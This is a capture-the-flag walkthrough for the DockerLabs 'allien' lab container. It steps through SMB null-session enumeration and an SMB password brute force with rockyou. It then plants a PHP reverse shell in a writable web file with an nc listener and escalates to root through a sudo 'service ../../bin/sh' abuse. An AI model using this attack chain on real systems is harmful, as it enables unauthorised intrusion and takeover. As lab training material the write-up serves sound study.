# How to run the docker container
Download link: https://mega.nz/file/6RVkASLT#-F9PMveM06geq87FUaUAuHFpkEq85tG61zZGkswgcsE (Or just go to dockerlabs.es)

Afterwards, unzip the file, and run the command
```
sudo ./auto_deploy.sh allien.tar
```
Upon success, we get the container IP address 172.17.0.2

# Scanning the container IP address
We use nmap to scan the IP address to find any open ports we could use:
```
nmap -p- -sCV -T4 -vv 172.17.0.2 (what are these flags?)
```
## -p-
Scans for all ports (1-65535)

## -sC
Runs default scripts. Equivalent to --script=default. This performs common enumeration tasks like:

* Service version detection
* Banner grabbing
* Basic vulnerability checks
* Additional information gathering

## -sV
Enables version detection of the service running on the open ports

## -T4
Sets the timing template to "Aggressive" (0-5 scale):

*T0 = Paranoid
*T1 = Sneaky
*T2 = Polite
*T3 = Normal (default)
*T4 = Aggressive
*T5 = Insane

Sets up scan speed. <br>

## -vv
Very verbose output. Provides maximum detail of the scan.

## Output
We should see 4 open ports: 22, 80, 445 and 139. Port 445 and 139 runs the SMB protocol:

```
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4
```

# In this challenge, there is an SMB service that allows null sessions (no username and password)
To verify that, we run netExec:
```
nxc smb 172.17.0.2 -u '' -p ''
```
*  -u means username
*  -p means password
The entries in the quotation marks are the values for each flag.
It should return "Null Auth:True"
tagging the command with:
```
nxc smb 172.17.0.2 -u '' -p '' --username
```
allows us to see the users in the protocol. 'satriani7' is our target here.

# Run brute force password cracking 
We use netExec to bruteforce the password with a standard password list rockyou.txt:
```
nxc smb 172.17.0.2 -u 'satriani7' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```
and walah, we get a success!
```
SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent
```
Now that we have access to the account, we can list shares to see what goodies awaits us. Shares are file directories that are made accessible on the network.
```
nxc smb 172.17.0.2 -u 'satriani7' -p '50cent' --shares
```
```
SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent 
SMB         172.17.0.2      445    SAMBASERVER      [*] Enumerated shares
SMB         172.17.0.2      445    SAMBASERVER      Share           Permissions     Remark
SMB         172.17.0.2      445    SAMBASERVER      -----           -----------     ------
SMB         172.17.0.2      445    SAMBASERVER      myshare         READ            Carpeta compartida sin restricciones                                                                      
SMB         172.17.0.2      445    SAMBASERVER      backup24        READ            Privado
SMB         172.17.0.2      445    SAMBASERVER      home                            Produccion
SMB         172.17.0.2      445    SAMBASERVER      IPC$                            IPC Service (EseEmeB Samba Server)                                                                        
```
There appears to be a READ access to `backup24` which is named "Private" in the remark. We will be using the tool `smbclient` to connect to the resource `backup24`
```
smbclient //172.17.0.2/backup24 -U satriani7%50cent
```
-U is "specify username". It can include the password, like username%password. <br>

Listing the resource exposes these files:
```
.                                   D        0  Sun Oct  6 15:19:03 2024
..                                  D        0  Sun Oct  6 15:19:03 2024
Documents                           D        0  Sun Oct  6 15:15:03 2024
CQFO6Q~M                            D        0  Sun Oct  6 15:19:03 2024
Pictures                            D        0  Sun Oct  6 15:15:03 2024
Downloads                           D        0  Sun Oct  6 15:15:03 2024
Desktop                             D        0  Sun Oct  6 15:18:46 2024
Temp                                D        0  Sun Oct  6 15:18:51 2024
Videos                              D        0  Sun Oct  6 15:15:03 2024

              77749956 blocks of size 1024. 53951504 blocks available

```
Exploring the file directory, I came across `credentials.txt` in `\documents\Personal`.

```
get credentials.txt
cat credential.txt (after exiting from SMB network share)
```
We get a list of credentials:
```
# Archivo de credenciales

Este documento expone credenciales de usuarios, incluyendo la del usuario administrador.

Usuarios:
-------------------------------------------------
1. Usuario: jsmith
   - Contraseña: PassJsmith2024!

2. Usuario: abrown
   - Contraseña: PassAbrown2024!

3. Usuario: lgarcia
   - Contraseña: PassLgarcia2024!

4. Usuario: kchen
   - Contraseña: PassKchen2024!

5. Usuario: tjohnson
   - Contraseña: PassTjohnson2024!

6. Usuario: emiller
   - Contraseña: PassEmiller2024!
   
7. Usuario: administrador
    - Contraseña: Adm1nP4ss2024   

8. Usuario: dwhite
   - Contraseña: PassDwhite2024!

9. Usuario: nlewis
   - Contraseña: PassNlewis2024!

10. Usuario: srodriguez
   - Contraseña: PassSrodriguez2024!
```
Looks like we got credentials of the administrador. We initiate a connection to this user through SSH:
```
ssh administrador@172.17.0.2
```
Once we are in, we use `ls -al` to list all hidden files and directories. 
```
total 32
drwxr-x--- 1 administrador administrador 4096 Mar  7 09:08 .
drwxr-xr-x 1 root          root          4096 Oct  6  2024 ..
-rw------- 1 administrador administrador   27 Mar  7 09:08 .bash_history
-rw-r--r-- 1 administrador administrador  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 administrador administrador 3771 Mar 31  2024 .bashrc
drwx------ 2 administrador administrador 4096 Mar  7 08:59 .cache
-rw-r--r-- 1 administrador administrador  807 Mar 31  2024 .profile
```
The one I am interested in immediately is the root directory. But trying to `cd /root` is denied. Therefore we need to perform privilege escalation.
```
cat /etc/passwd
```
This will list all users on the system and their basic information.
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
usuario1:x:1001:1001:,,,:/home/usuario1:/bin/bash
usuario2:x:1002:1002:,,,:/home/usuario2:/bin/bash
usuario3:x:1003:1003:,,,:/home/usuario3:/bin/bash
satriani7:x:1004:1004:,,,:/home/satriani7:/bin/bash
administrador:x:1005:1005::/home/administrador:/bin/sh
```
Seems like administrador is not the root user. T^T

# After this, all goes to shit (I don't understand)
Uh so we run `find / -user adminstrador 2>/dev/null | grep -v proc` to find all files they own that doesn't include the proc directory (those are useless data)


* find: The find command - searches for files and directories
* / 	Start search from root directory (entire filesystem)
* -user administrador:	Find files owned by user "administrador"
* 2>/dev/null:	Redirect error messages (stderr) to the null device (discard them)\
* grep -v proc: reverse the grep to not include lines with the word 'proc'

```
/var/www/html
/var/www/html/info.php
/dev/pts/0
/home/administrador
/home/administrador/.bashrc
/home/administrador/.bash_logout
/home/administrador/.profile
/home/administrador/.bash_history
/home/administrador/.cache
/home/administrador/.cache/motd.legal-displayed
```
Somehow, `/var/www/html/info.php` is suspicious, as only the website owner or rootuser should own this file. Looking at the file permissions, our administrador user and rwx on it!

Reverse shell access? Copy the reverse shell code from my linux system `locate php-reverse` <br>
Copy that code into `/var/www/html/info.php` <br>
To activate, access the page on the web. Set up reverse shell listener.
```
rlwrap nc -nlvp 443 //listener
```
Then go to `http//172.17.0.2/info.php` on my web browser. The listener will pick up the connection. <br>
Then somehow I am the www-data user now.. Then we do 
```
which python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
As a final privilege escalation step, www-data has sudo permissions with the service binary(??) after running `sudo -l` Sorry?
```
User www-data may run the following commands on 6cdb530a586b:
    (ALL) NOPASSWD: /usr/sbin/service
```
I can run service as root without password. <br>
Consultation GTFOBins to find ways to abuse service and escalate to root and I find the following:
```
www-data@0318689382b0:/$ sudo /usr/sbin/service ../../bin/sh              
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```
We have now access to root. 

